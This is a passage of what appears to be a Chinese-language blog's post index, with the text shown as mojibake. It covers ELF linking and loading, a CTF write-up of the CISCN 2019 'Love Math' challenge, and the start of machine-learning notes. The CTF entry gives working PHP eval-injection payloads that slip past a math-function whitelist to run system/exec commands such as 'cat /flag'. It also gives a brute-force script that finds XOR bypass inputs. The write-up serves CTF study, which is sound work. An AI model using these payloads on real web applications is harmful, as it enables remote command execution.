ä¸ºaæ˜¯ä¸€ä¸ªå±€éƒ¨é™æ€å˜é‡ï¼Œä½œç”¨åŸŸåœ¨ä»–çš„å‡½æ•°ä½“ä¸­ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬åœ¨ä¸åŒçš„å‡½æ•°ä½“ä¸­å£°æ˜ç›¸åŒåå­—çš„å±€éƒ¨é™æ€å˜é‡ï¼ˆè¿™ç§æ“ä½œæ˜¯è¢«å…è®¸çš„ï¼‰è€Œä¸”å…¶ç”Ÿå‘½å‘¨æœŸä¸ºæ•´ä¸ªç¨‹åºæ‰§è¡Œæ—¶ï¼Œç¼–è¯‘å™¨ä¸ºäº†æ”¯æŒè¿™ç§åŠŸèƒ½ï¼Œæ‰€ä»¥æ¥åŠ åç¼€æ¥æ ‡è¯†ä¸åŒçš„å±€éƒ¨é™æ€å˜é‡ã€‚</p><p>æˆ‘ä»¬è¿˜å¯ä»¥ç”¨objdumpæ¥æŸ¥çœ‹ç›®æ ‡æ–‡ä»¶çš„ç»“æ„ï¼Œ-hå‚æ•°å¯æŸ¥çœ‹å„ä¸ªæ®µçš„åŸºæœ¬ä¿¡æ¯</p><p><img src="https://i.loli.net/2021/03/09/5GTWh29juR6pxUZ.png" style="zoom:50%;" /></p><p>Sizeè¡¨ç¤ºæ®µé•¿åº¦<br>File offè¡¨ç¤ºåœ¨æ–‡ä»¶ä¸­çš„åç§»<br>æ¯ä¸ªæ®µç¬¬äºŒè¡Œä¸­çš„â€CONTENTSâ€ â€œALLOCâ€ç­‰è¡¨ç¤ºæ®µçš„å±æ€§ï¼Œâ€CONTENTSâ€è¡¨ç¤ºåœ¨æ–‡ä»¶ä¸­å­˜åœ¨<br>æ¯”å¦‚æ•°æ®æ®µçš„å¤§å°ä¸º0xcå­—èŠ‚å¤§å°ï¼Œå› ä¸ºæœ‰ä¸‰ä¸ªå››å­—èŠ‚çš„å˜é‡åˆ†åˆ«ä¸ºglobalA,globalCå’Œa</p><h2 id="é“¾æ¥"><a href="#é“¾æ¥" class="headerlink" title="é“¾æ¥"></a>é“¾æ¥</h2><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æ¥å®Œæˆé“¾æ¥è¿‡ç¨‹<br><code>gcc Binary.o -o BinaryName</code></p><p><img src="https://i.loli.net/2021/03/09/4MySVpGcZOiLqQr.png" style="zoom:50%;" /></p><p>å¯ä»¥çœ‹åˆ°ä¹‹å‰çš„ä¸€äº›ç›¸å¯¹åœ°å€å…¨éƒ¨å˜ä¸ºäº†ç»å¯¹åœ°å€ï¼Œå®Œæˆäº†åœ°å€é‡å®šä½</p><h2 id="è£…è½½è¿è¡Œ"><a href="#è£…è½½è¿è¡Œ" class="headerlink" title="è£…è½½è¿è¡Œ"></a>è£…è½½è¿è¡Œ</h2><p>å½“ç¨‹åºåŠ è½½è¿›å†…å­˜ç¨‹åºå³å¯è¿è¡Œï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­æˆ‘ä»¬ä¸å¾—ä¸æåˆ°è™šæ‹Ÿå†…å­˜ï¼ŒåŠ¨æ€é“¾æ¥åº“å’Œå‡½æ•°æ‰§è¡Œçš„é—®é¢˜ã€‚æˆ‘ä»¬ç»™å‡ºç¨‹åºæ‰§è¡Œçš„é¡ºåºï¼Œå…·ä½“æ¢ç©¶æˆ‘ä»¬ç­‰åˆ°ä¹‹åçš„æ–‡ç« å†å¦è¡Œåˆ†æã€‚</p><blockquote><p>  1.é¦–å…ˆ bash è¿›è¡Œ fork ç³»ç»Ÿè°ƒç”¨ï¼Œç”Ÿæˆä¸€ä¸ªå­è¿›ç¨‹ï¼Œæ¥ç€åœ¨å­è¿›ç¨‹ä¸­è¿è¡Œ execve å‡½æ•°æŒ‡å®šçš„ elf äºŒè¿›åˆ¶ç¨‹åºï¼ˆ Linuxä¸­æ‰§è¡ŒäºŒè¿›åˆ¶ç¨‹åºæœ€ç»ˆéƒ½æ˜¯é€šè¿‡ execve è¿™ä¸ªåº“å‡½æ•°è¿›è¡Œçš„ï¼‰ï¼Œexecve ä¼šè°ƒç”¨ç³»ç»Ÿè°ƒç”¨æŠŠ elf æ–‡ä»¶ load åˆ°å†…å­˜ä¸­çš„ä»£ç æ®µ(_text)ä¸­ã€‚<br>2.å¦‚æœæœ‰ä¾èµ–çš„åŠ¨æ€é“¾æ¥åº“ï¼Œä¼šè°ƒç”¨åŠ¨æ€é“¾æ¥å™¨è¿›è¡Œåº“æ–‡ä»¶çš„åœ°å€æ˜ å°„ï¼ŒåŠ¨æ€é“¾æ¥åº“çš„å†…å­˜ç©ºé—´æ˜¯è¢«å¤šä¸ªè¿›ç¨‹å…±äº«çš„ã€‚<br>3.å†…æ ¸ä» elf æ–‡ä»¶å¤´å¾—åˆ°_startçš„åœ°å€ï¼Œè°ƒåº¦æ‰§è¡Œæµä»_startæŒ‡å‘çš„åœ°å€å¼€å§‹æ‰§è¡Œï¼Œæ‰§è¡Œæµåœ¨_startæ‰§è¡Œçš„ä»£ç æ®µä¸­è·³è½¬åˆ°libcä¸­çš„å…¬å…±åˆå§‹åŒ–ä»£ç æ®µ<strong>libc_start_mainï¼Œè¿›è¡Œç¨‹åºè¿è¡Œå‰çš„åˆå§‹åŒ–å·¥ä½œã€‚<br>4.</strong>libc_start_mainçš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œä¼šè·³è½¬åˆ°_initä¸­å…¨å±€å˜é‡çš„åˆå§‹åŒ–å·¥ä½œï¼Œéšåè°ƒç”¨æˆ‘ä»¬çš„mainå‡½æ•°ï¼Œè¿›å…¥åˆ°ä¸»å‡½æ•°çš„æŒ‡ä»¤æµç¨‹ã€‚</p></blockquote><h2 id="å‚è€ƒæ–‡çŒ®"><a href="#å‚è€ƒæ–‡çŒ®" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h2><ul><li>ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ã€‹</li><li><a href="https://www.nosuchfield.com/2018/11/23/Program-compilation-linking-loading-and-running/">https://www.nosuchfield.com/2018/11/23/Program-compilation-linking-loading-and-running/</a></li><li><a href="https://tech.meituan.com/2015/01/22/linker.html">https://tech.meituan.com/2015/01/22/linker.html</a></li><li><a href="https://code.woboq.org/">https://code.woboq.org/</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> äºŒè¿›åˆ¶ </tag>
            
            <tag> ç¨‹åºä¸æ“ä½œç³»ç»Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf:[CISCN 2019 åˆèµ›] Love Math-æ€»ç»“æ•°å­¦ä¸­çš„å‘½ä»¤æ‰§è¡Œ</title>
      <link href="2021/03/06/web1-love-math/"/>
      <url>2021/03/06/web1-love-math/</url>
      
        <content type="html"><![CDATA[<h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><ul><li>å¼€å±€ç»™äº†æºç  æ‹¿åˆ°æœ¬åœ°åˆ†æä¸€ä¸‹<br><img src="https://i.loli.net/2021/03/06/oLhWucimrZ1tPB2.png" alt="1.png"></li></ul><p><img src="https://i.loli.net/2021/03/06/JiyeCSQMwdnHIXq.png" alt="2.png"></p><p><img src="https://i.loli.net/2021/03/06/V1DGCytmnK2Yai9.png" alt="3.png"></p><p>ç™½åå•åªç»™äº†ä¸€å †æ•°å­¦å‡½æ•°<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br></pre></td></tr></table></figure></p><p>ä»é‡Œé¢æ‰¾å‡ºæ¥èƒ½å¤Ÿåˆ©ç”¨çš„æ‹¼å‡‘å‡ºå‘½ä»¤æ‰§è¡Œ</p><p>æœ€ç»ˆè‚¯å®šå¸Œæœ›èƒ½å¤Ÿè¾¾æˆè¿™æ ·çš„ç»“æœ<code>eval(&#39;echo&#39; . &#39;$_POST[1]&#39; . &#39;;&#39;)</code><br>æ‰€ä»¥éš¾ç‚¹åœ¨äºå¦‚ä½•åˆ©ç”¨å·²çŸ¥å‡½æ•°æ¥æ‹¼å‡‘å‡º$_POST</p><h3 id="å‡ ä¸ªå‡½æ•°"><a href="#å‡ ä¸ªå‡½æ•°" class="headerlink" title="å‡ ä¸ªå‡½æ•°"></a>å‡ ä¸ªå‡½æ•°</h3><ol><li>hex2bin â€” è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</li><li>base_convert â€” åœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—ï¼Œæœ€é«˜ä¸º36è¿›åˆ¶</li><li>dechex â€” åè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶</li></ol><p>åˆ©ç”¨base_convertå‡‘å‡ºæ¥hex2bin,å†åˆ©ç”¨hex2binå‡‘å‡ºæ¥_POST,æœ€åç”¨å¯å˜å˜é‡å®Œæˆå‘½ä»¤æ‰§è¡Œ</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">409369269076</span>));<span class="variable">$$pi</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$$pi</span>&#123;<span class="number">2</span>&#125;)</span><br><span class="line"></span><br><span class="line">c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>); <span class="comment">// base_convert(37907361743,10,36) = hex2bin</span></span><br><span class="line">dechex(<span class="number">409369269076</span>); <span class="comment">// è½¬æˆ_POSTå­—ç¬¦ä¸²çš„åå…­è¿›åˆ¶</span></span><br><span class="line"></span><br><span class="line">ä»¥ä¸Šä¸¤ä¸ªè¯­å¥åˆèµ·æ¥ä¸º <span class="variable">$pi</span> = hex2bin(<span class="string">&#x27;5f504f5354&#x27;</span>) = _POST;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$pi</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$$pi</span>&#123;<span class="number">2</span>&#125;) = <span class="variable">$_POST</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$_POST</span>&#123;<span class="number">2</span>&#125;); <span class="comment">// ä¸­æ‹¬å·è¢«ban,ç”¨å¤§æ‹¬å·æ¥ç»•è¿‡</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/06/oC6xULjHR1aP9kD.png" alt="4.png"></p><h2 id="å…¶ä»–payload"><a href="#å…¶ä»–payload" class="headerlink" title="å…¶ä»–payload"></a>å…¶ä»–payload</h2><h3 id="getä¼ å…¥å‚æ•°å‘½ä»¤æ‰§è¡Œ"><a href="#getä¼ å…¥å‚æ•°å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="getä¼ å…¥å‚æ•°å‘½ä»¤æ‰§è¡Œ"></a>getä¼ å…¥å‚æ•°å‘½ä»¤æ‰§è¡Œ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="variable">$abs</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));<span class="variable">$$abs</span>&#123;pi&#125;(<span class="variable">$$abs</span>&#123;sin&#125;)&amp;pi=system&amp;sin=cat /flag</span><br><span class="line"></span><br><span class="line"><span class="variable">$abs</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>)) = _GET;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$abs</span>&#123;pi&#125;(<span class="variable">$$abs</span>&#123;sin&#125; = <span class="variable">$_GET</span>&#123;pi&#125;(<span class="variable">$_GET</span>&#123;sin&#125;); <span class="comment">// é€šè¿‡getæ–¹æ³•ä¼ å…¥å‚æ•°å®Œæˆå‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="headersä¼ å…¥å‚æ•°å‘½ä»¤æ‰§è¡Œ"><a href="#headersä¼ å…¥å‚æ•°å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="headersä¼ å…¥å‚æ•°å‘½ä»¤æ‰§è¡Œ"></a>headersä¼ å…¥å‚æ•°å‘½ä»¤æ‰§è¡Œ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="variable">$pi</span>=base_convert,<span class="variable">$pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)((<span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable">$pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) = base_convert(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) = exec</span><br><span class="line">((<span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;) = ((base_convert(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;) = getallheaders()&#123;<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">å³ exec(getallheaders()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‡ ç‚¹è¯´æ˜</p><p>getallheaders â€” è·å–å…¨éƒ¨ HTTP è¯·æ±‚å¤´ä¿¡æ¯</p><p><img src="https://i.loli.net/2021/03/06/CcBEwGWhjMp9AmO.png" alt="5.png"></p><p>å½“å–æ•°ç»„å…ƒç´ æ—¶ï¼Œç”¨å¤§æ‹¬å·ä¼šæŠ›å‡ºè­¦å‘Šè€Œä¸æ˜¯é”™è¯¯</p><p><img src="https://i.loli.net/2021/03/06/WtgMeZJO6rl25QV.png" alt="6.png"></p><p>ç”¨ä¸Šè¿°payload åŠ ä¸Š postmanæ”¹ä¸‹headerså³å¯å‘½ä»¤æ‰§è¡Œgetflag</p><p><img src="https://i.loli.net/2021/03/06/4kdNB8AUj59IiHu.png" alt="9.png"></p><h3 id="å­—ç¬¦ä¸²å¼‚æˆ–å‘½ä»¤æ‰§è¡Œ"><a href="#å­—ç¬¦ä¸²å¼‚æˆ–å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å­—ç¬¦ä¸²å¼‚æˆ–å‘½ä»¤æ‰§è¡Œ"></a>å­—ç¬¦ä¸²å¼‚æˆ–å‘½ä»¤æ‰§è¡Œ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$whitelist</span> <span class="keyword">as</span> <span class="variable">$white</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">999999</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ decbin(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;decbin:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ decoct(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;decoct:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ dechex(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;dechex:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> .  <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/06/uGUmVAZe5BXbazM.png" alt="7.png"></p><p>å‘ç°ä¿©èƒ½ç”¨çš„</p><p><code>payload:?c=$pi=dechex(481137)^hexdec;$$pi&#123;1&#125;($$pi&#123;2&#125;)</code></p><p><img src="https://i.loli.net/2021/03/06/y6aTOkVeDoFPcmC.png" alt="8.png"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><p><a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html">https://www.cnblogs.com/wangtanzhi/p/12246731.html</a><br><a href="https://www.bilibili.com/video/BV1pE411f7DN?t=1567">https://www.bilibili.com/video/BV1pE411f7DN?t=1567</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> web </tag>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Machine Learning</title>
      <link href="2021/03/05/ML/"/>
      <url>2021/03/05/ML/</url>
      
        <content type="html"><![CDATA[<h2 id="1-4-Unsupervised-Learning"><a href="#1-4-Unsupervised-Learning" class="headerlink" title="1-4.Unsupervised Learning"></a>1-4.Unsupervised Learning</h2><p>google newsï¼šèšç±»ç®—æ³•ï¼Œæ— ç›‘ç£å­¦ä¹ ç®—æ³•</p><p><img src="https://i.loli.net/2021/03/06/1TFOpXztKCkwcrW.png" alt="image-20210306085443145.png"></p><p>èšç±»ç®—æ³•æ˜¯unsupervised learningçš„ä¸€ç§</p><p><img src="https://i.loli.net/2021/03/06/r5F1CvS3Zx9bGOk.png" alt=""></p><blockquote><p>B is a unsupervised learning problem.</p></blockquote><h2 id="2-1-æ¨¡å‹æè¿°"><a href="#2-1-æ¨¡å‹æè¿°" class="headerlink" title="2-1.æ¨¡å‹æè¿°"></a>2-1.æ¨¡å‹æè¿°</h2><p><img src="https://i.loli.net/2021/03/06/fF3lQLcRgkxP5iW.png" alt=""></p><p>æ ¹æ®æ‹ŸåˆçŠ¶å†µé¢„ä¼°æˆ¿ä»·ï¼Œæ˜¯ä¸€ä¸ªsupervised learning problemï¼Œå› ä¸ºæ¯ä¸€ä¸ªå¤§å°éƒ½æœ‰ä¸€ä¸ªâ€œæ­£ç¡®çš„ç­”æ¡ˆâ€ï¼Œå¹¶ä¸”è¿˜æ˜¯å›å½’é—®é¢˜ã€‚</p><p>Notation:</p><ul><li>m = Number of training examples</li><li>x = â€œinputâ€ variable / features</li><li><p>y = â€œoutputâ€ variable / â€œtargetâ€ variable</p></li><li><p>(x,y) = one traing example</p></li><li><p>$(x^{(i)},y^{(i)})$ = $i^{th}$   training example (not exponentiation,i means â€œindexâ€)</p></li><li><p>h = hypothesis</p></li></ul><p><img src="https://i.loli.net/2021/03/06/2EMSJuBbaqKs6oI.png" alt=""><br>Linear regression with one variable.Univariate linear regression.(one variable)</p><h2 id="2-2ä»£ä»·å‡½æ•°-ä¸€"><a href="#2-2ä»£ä»·å‡½æ•°-ä¸€" class="headerlink" title="2.2ä»£ä»·å‡½æ•°(ä¸€)"></a>2.2ä»£ä»·å‡½æ•°(ä¸€)</h2><p><img src="https://i.loli.net/2021/03/06/U9H7TZXSpEtYdaj.png" alt=""></p><p>Cost function  </p><script type="math/tex; mode=display">J(\theta_0,\theta_1)=\frac 1{2m}\sum_{i=1}^m(h_{\theta}(x^{(i)}-y^{(i)})^2</script><h2 id="2-3ä»£ä»·å‡½æ•°-äºŒ"><a href="#2-3ä»£ä»·å‡½æ•°-äºŒ" class="headerlink" title="2.3ä»£ä»·å‡½æ•°(äºŒ)"></a>2.3ä»£ä»·å‡½æ•°(äºŒ)</h2><p><img src="https://i.loli.net/2021/03/06/jwi5Mp2K8b3CLPq.png" alt=""></p><p><img src="https://i.loli.net/2021/03/06/4sFmDZuqdGVTi7S.png" alt=""></p><p>ç®€åŒ–ä»£ä»·å‡½æ•°ä½¿å¾—$\theta_0 = 0$ï¼Œç†è§£ä»£ä»·å‡½æ•°</p><p>å¯¹äºä¸Šå›¾ç‰¹æ®Šçš„training setï¼Œå¯ä»¥æ‰¾å‡º$\theta_1 = 1$æ—¶ï¼Œå¯ä»¥å®Œç¾æ‹Ÿåˆ</p><h2 id="2-4ä»£ä»·å‡½æ•°-ä¸‰"><a href="#2-4ä»£ä»·å‡½æ•°-ä¸‰" class="headerlink" title="2.4ä»£ä»·å‡½æ•°(ä¸‰)"></a>2.4ä»£ä»·å‡½æ•°(ä¸‰)</h2><p>å½“æˆ‘ä»¬ä½¿ç”¨$\theta_0$å’Œ$\theta_1$æ—¶ï¼Œå¾—åˆ°cost functionå›¾åƒç±»ä¼¼ä¸‹å›¾</p><p><img src="https://i.loli.net/2021/03/06/skDZCp4OwtTFYib.png" alt=""></p><p>ä½¿ç”¨ç­‰é«˜çº¿çš„æ–¹å¼æ¥æ¨¡æ‹Ÿï¼Œæƒ³è±¡ä»ç¢—çš„ä¸Šæ–¹å‘åº•éƒ¨çœ‹ï¼Œminimize J($\theta_0$,$\theta_1$) å°±æ˜¯æ¤­åœ†çš„ä¸­å¿ƒï¼Œå¦‚ä¸‹å›¾çš„æ•°æ®æ‹Ÿåˆè¾ƒä¸ºä¸é”™ï¼Œcost valueå¯ä»¥æ¥å—</p><p><img src="https://i.loli.net/2021/03/06/JVmZ7oFTpRDU1zd.png" alt=""></p><h2 id="2-5-æ¢¯åº¦ä¸‹é™"><a href="#2-5-æ¢¯åº¦ä¸‹é™" class="headerlink" title="2.5 æ¢¯åº¦ä¸‹é™"></a>2.5 æ¢¯åº¦ä¸‹é™</h2><p>Repeat until convergence{</p><p>â€‹    $\theta_j := \theta_j - \alpha\frac{\partial}{\partial\theta_j}J(\theta_0,\theta_1)  $        (for j = 0 and j = 1) </p><p>}</p><p>// := assignment       ( a := a + 1)</p><p>// $\alpha$ä¸ºå­¦ä¹ ç‡ï¼Œå¤§çš„æ—¶å€™ä¸‹å±±æ­¥å­å¤§</p><p><img src="https://i.loli.net/2021/03/09/gQYal6ocdpKqC9R.png" alt="æ¢¯åº¦ä¸‹é™1.png" style="zoom:50%;" /></p><h2 id="2-6-æ¢¯åº¦ä¸‹é™ç†è§£"><a href="#2-6-æ¢¯åº¦ä¸‹é™ç†è§£" class="headerlink" title="2.6 æ¢¯åº¦ä¸‹é™ç†è§£"></a>2.6 æ¢¯åº¦ä¸‹é™ç†è§£</h2><ul><li>æ¢¯åº¦ä¸‹é™å¯¼æ•°é¡¹çš„æ„ä¹‰</li></ul><p><img src="https://i.loli.net/2021/03/09/CyXR7G4TLIKQO1w.png" alt="æ¢¯åº¦ä¸‹é™2.png" style="zoom:50%;" /></p><ul><li>æ¢¯åº¦ä¸‹é™å­¦ä¹ ç‡å¤§å°çš„æ„ä¹‰</li></ul><p><img src="https://i.loli.net/2021/03/09/N1mFSpIkrPAnljb.png" alt="æ¢¯åº¦ä¸‹é™3-alphaå«ä¹‰.png" style="zoom:50%;" /></p><ul><li>æ¢¯åº¦ä¸‹é™åˆ°å±€éƒ¨æœ€ä¼˜ç‚¹çš„ç»“æœ</li></ul><p><img src="https://i.loli.net/2021/03/09/nSg2xDTV7yROecG.png" alt="æ¢¯åº¦ä¸‹é™4-å±€éƒ¨æœ€ä¼˜ç‚¹çš„ç»“æœ.png" style="zoom:50%;" /></p><h2 id="2-7-çº¿æ€§å›å½’çš„æ¢¯åº¦ä¸‹é™"><a href="#2-7-çº¿æ€§å›å½’çš„æ¢¯åº¦ä¸‹é™" class="headerlink" title="2.7 çº¿æ€§å›å½’çš„æ¢¯åº¦ä¸‹é™"></a>2.7 çº¿æ€§å›å½’çš„æ¢¯åº¦ä¸‹é™</h2><p>æ¢¯åº¦ä¸‹é™ä¸­å¯¼æ•°é‚£ä¸€é¡¹ï¼š</p><script type="math/tex; mode=display">\frac\partial{\partial\theta_j}J(\theta_0,\theta_1) = 